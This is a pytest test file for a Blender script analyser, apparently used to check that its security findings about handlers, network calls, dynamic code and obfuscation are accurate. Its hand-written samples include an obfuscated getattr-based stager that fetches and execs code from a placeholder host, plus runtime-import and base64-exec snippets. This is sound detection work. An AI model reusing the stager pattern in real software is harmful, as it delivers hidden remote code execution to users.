# SPDX-License-Identifier: GPL-3.0-or-later
"""Each statement's sentence must be true of everything that can produce it.

These are the regressions for the false claims a second review found: a
handler reported as ``@persistent`` when it was not, ``urllib.parse`` reported
as reaching the internet, ``compile()`` reported as running code, a data blob's
decompression reported as deliberately hidden, and a functional stager
reported as nothing at all.

Every sample is written here by hand. Nothing is fetched and no real malware
sample is used or required. Nothing in these tests executes any sample.
"""

from __future__ import annotations

import pytest

from blend_xray import explain
from blend_xray.explain import Severity


def keys_of(source: str) -> set[str]:
    return {st.key for st in explain.explain_source(source).statements}


# ==========================================================================
# 1. @persistent is a claim about the decorator, not about handlers.
# ==========================================================================
HANDLER_PLAIN = """
import bpy

def ensure_custom_panels(scene):
    pass

def register():
    bpy.app.handlers.load_post.append(ensure_custom_panels)
    bpy.app.handlers.depsgraph_update_post.append(ensure_custom_panels)
"""

HANDLER_PERSISTENT = """
import bpy
from bpy.app.handlers import persistent

@persistent
def on_load(dummy):
    pass

bpy.app.handlers.load_post.append(on_load)
"""

HANDLER_PERSISTENT_ALIASED = """
import bpy
from bpy.app.handlers import persistent as keep_me

@keep_me
def on_load(dummy):
    pass

bpy.app.handlers.load_post.append(on_load)
"""


def test_undecorated_handler_does_not_claim_persistence() -> None:
    """Blender strips it on the next file load, so we must not say otherwise.

    ``BPY_python_reset`` calls ``BPY_app_handlers_reset(false)``, which keeps
    only callbacks tagged ``_bpy_persistent``, and it runs before the incoming
    file's own scripts. This is the ``cloudrig.py`` /
    ``rigged_particle_hair.py`` shape -- 26 findings across 19 files of the
    institutional corpus were being told they had permanently infected the
    artist's session.
    """
    keys = keys_of(HANDLER_PLAIN)
    assert "x_handler_register" in keys
    assert "x_handler_persist" not in keys


def test_decorated_handler_still_claims_persistence() -> None:
    keys = keys_of(HANDLER_PERSISTENT)
    assert "x_handler_persist" in keys
    assert "x_handler_register" not in keys


def test_persistence_survives_an_aliased_import() -> None:
    assert "x_handler_persist" in keys_of(HANDLER_PERSISTENT_ALIASED)


def test_persistence_claim_names_the_decorated_callback() -> None:
    statements = explain.explain_source(HANDLER_PERSISTENT).statements
    persist = next(st for st in statements if st.key == "x_handler_persist")
    assert any("@persistent" in item and "on_load" in item for item in persist.evidence)


def test_a_decorator_on_an_unregistered_function_is_not_a_handler_finding() -> None:
    source = "from bpy.app.handlers import persistent\n\n@persistent\ndef cb(x):\n    pass\n"
    keys = keys_of(source)
    assert "x_handler_persist" not in keys
    assert "x_handler_register" not in keys


# ==========================================================================
# 3. x_network means a connection is opened, not a module family.
# ==========================================================================
def test_urllib_parse_is_not_a_network_finding() -> None:
    """Percent-encoding a string is not reaching the internet.

    The bare ``urllib`` entry swallowed every submodule under it, so this
    two-line script drew the RED banner.
    """
    assert "x_network" not in keys_of("from urllib.parse import quote\nquote('a b')\n")


@pytest.mark.parametrize(
    "source",
    [
        "import urllib.request\nurllib.request.urlopen('http://x.example.com')\n",
        "from urllib.request import urlopen\nurlopen('http://x.example.com')\n",
        "import requests\nrequests.get('http://x.example.com')\n",
        "import socket\nsocket.socket()\n",
        "import http.client\n",
    ],
)
def test_real_network_modules_still_fire(source: str) -> None:
    assert "x_network" in keys_of(source)


def test_webbrowser_is_not_a_network_finding() -> None:
    """It launches the user's browser; a Documentation button does this."""
    keys = keys_of("import webbrowser\nwebbrowser.open('https://docs.example.com')\n")
    assert "x_network" not in keys
    assert "x_opens_browser" in keys


def test_socketserver_is_reported_as_listening_not_dialling_out() -> None:
    keys = keys_of("import socketserver\n")
    assert "x_network" not in keys
    assert "x_network_listen" in keys


# ==========================================================================
# 4. Dynamic code and obfuscation, split so each sentence is true.
# ==========================================================================
def test_compile_alone_does_not_claim_to_run_anything() -> None:
    keys = keys_of("compile('1+1', '<s>', 'eval')\n")
    assert "x_compile_code" in keys
    assert "x_dynamic_code" not in keys


def test_literal_import_is_not_the_same_finding_as_a_computed_one() -> None:
    literal = keys_of("__import__('os')\n")
    assert "x_runtime_import" in literal
    assert "x_dynamic_code" not in literal

    computed = keys_of("import sys\nname = sys.argv[0]\n__import__(name)\n")
    assert "x_dynamic_code" in computed


def test_pickle_gets_its_own_weaker_sentence() -> None:
    """What runs lives in the data file, which this tool cannot see."""
    keys = keys_of("import pickle\npickle.load(open('f','rb'))\n")
    assert "x_deserialise" in keys
    assert "x_dynamic_code" not in keys


def test_decompressing_a_blob_is_not_called_hidden_code() -> None:
    keys = keys_of("import zlib\nzlib.decompress(b'blob')\n")
    assert "x_decodes_data" in keys
    assert "x_obfuscation" not in keys


def test_bare_decode_severity_is_notable_not_alarming() -> None:
    statements = explain.explain_source("import bz2\nbz2.decompress(b'x')\n").statements
    decode = next(st for st in statements if st.key == "x_decodes_data")
    assert decode.severity is Severity.NOTABLE


def test_decode_plus_execute_is_still_the_alarming_finding() -> None:
    keys = keys_of("import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n")
    assert "x_obfuscation" in keys
    assert "x_dynamic_code" in keys


# ==========================================================================
# 6. The shape of the obfuscation itself.
# ==========================================================================
#: The security review's PoC body, verbatim in shape.
GETATTR_STAGER = """
import bpy
g = getattr
i = g(__builtins__, '__imp' + 'ort__')
e = g(__builtins__, 'e' + 'xec')
m = i('url' + 'lib.request')
u = 'htt' + 'p' + ':' + '/' + '/' + 'x.example' + '.com' + '/' + 'p'
e(g(m, 'url' + 'open')(u).read())
"""

#: The CloudRig line that makes "a call whose callee is a call" useless as a
#: rule on its own -- it appears in 20 of the 100 parseable corpus bodies.
CLOUDRIG_CALL_OF_CALL = """
def scene_frames(frames, anim_data, invert):
    return type(frames)((anim_data.nla_tweak_strip_time_to_scene(v) for v in frames))
"""

#: An ordinary getattr result being called. Normal in rig UI code, and it must
#: stay silent or the new rules cost more than they buy.
ORDINARY_GETATTR_CALL = """
import bpy

def run(name, context):
    func = getattr(bpy.ops.pose, name)
    func()
"""


def test_getattr_stager_is_no_longer_invisible() -> None:
    """Was: statements=NONE, literals=NONE, max_severity=BENIGN."""
    result = explain.explain_source(GETATTR_STAGER)
    keys = {st.key for st in result.statements}
    assert result.max_severity is Severity.ALARMING
    assert "x_builtins_indirection" in keys
    assert "x_indirect_call" in keys
    assert "x_assembled_name" in keys
    assert result.obfuscated is True


def test_evasion_rules_stay_silent_on_the_cloudrig_idiom() -> None:
    keys = keys_of(CLOUDRIG_CALL_OF_CALL)
    assert "x_indirect_call" not in keys
    assert "x_builtins_indirection" not in keys


def test_evasion_rules_stay_silent_on_an_ordinary_getattr_result() -> None:
    keys = keys_of(ORDINARY_GETATTR_CALL)
    assert "x_indirect_call" not in keys
    assert "x_assembled_name" not in keys


def test_attribute_reached_through_a_runtime_import_is_caught() -> None:
    """``dotted_name()`` returns "" here, which is what hid ``os.system``."""
    assert "x_indirect_call" in keys_of("__import__('os').system('calc.exe')\n")


def test_a_rebound_getattr_does_not_hide_the_builtins_lookup() -> None:
    assert "x_builtins_indirection" in keys_of("g = getattr\ng(__builtins__, 'exec')\n")


def test_split_literals_alone_are_only_notable() -> None:
    statements = explain.explain_source("msg = 'hel' + 'lo'\n").statements
    assert [st.key for st in statements] == ["x_split_literal"]
    assert statements[0].severity is Severity.NOTABLE


def test_an_alias_cycle_does_not_hang_the_collector() -> None:
    """``a = b`` / ``b = a`` must terminate, not spin the resolver."""
    assert explain.explain_source("a = b\nb = a\na()\n").parsed is True


def test_concatenation_evidence_is_the_finished_text_not_every_prefix() -> None:
    """Eight nested ``+`` nodes are one concatenation, not eight."""
    source = "u = 'htt' + 'p' + ':' + '/' + '/' + 'x.example' + '.com' + '/' + 'p'\n"
    statements = explain.explain_source(source).statements
    split = next(st for st in statements if st.key == "x_split_literal")
    assert split.evidence == ("http://x.example.com/p",)


# ==========================================================================
# The one-line block summary must match what fired, too.
# ==========================================================================
def test_the_block_summary_does_not_invent_a_decode() -> None:
    """The summary used to hardcode the "has to be decoded" sentence.

    With several ways to be hiding, that printed a decode claim over a block
    that decodes nothing -- the same class of false sentence the rest of this
    module exists to prevent.
    """
    from blend_xray.report import headline_for

    text, spotlight = headline_for(explain.explain_source(GETATTR_STAGER))
    assert spotlight is True
    assert "decoded" not in text
    assert "built-in" in text


def test_the_block_summary_still_says_decoded_when_something_decodes() -> None:
    from blend_xray.report import headline_for

    source = "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n"
    text, spotlight = headline_for(explain.explain_source(source))
    assert spotlight is True
    assert "builds and runs code" in text
